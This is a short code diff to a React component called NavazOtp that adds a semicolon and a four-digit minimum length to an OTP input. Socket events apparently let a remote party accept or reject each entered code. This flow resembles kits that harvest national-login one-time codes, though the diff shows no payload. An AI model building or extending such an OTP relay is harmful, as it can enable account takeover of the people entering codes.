@@ -54,7 +54,7 @@ const NavazOtp = ({ setMode, checkMode }) => {
     if (ID === sessionStorage.getItem("id")) {
       setError(true);
       setLoading(false);
-      setOtp(null)
+      setOtp(null);
     }
   });
   socket.on("acceptNavazOTP", (id) => {
@@ -83,6 +83,7 @@ const NavazOtp = ({ setMode, checkMode }) => {
             required
             onChange={(e) => setOtp(e.target.value)}
             dir="ltr"
+            minLength={4}
             inputMode="numeric"
             type="text"
             className="border px-3 py-1  border-gray-300 text-base text-right outline-[#ffc107] rounded-md w-full"
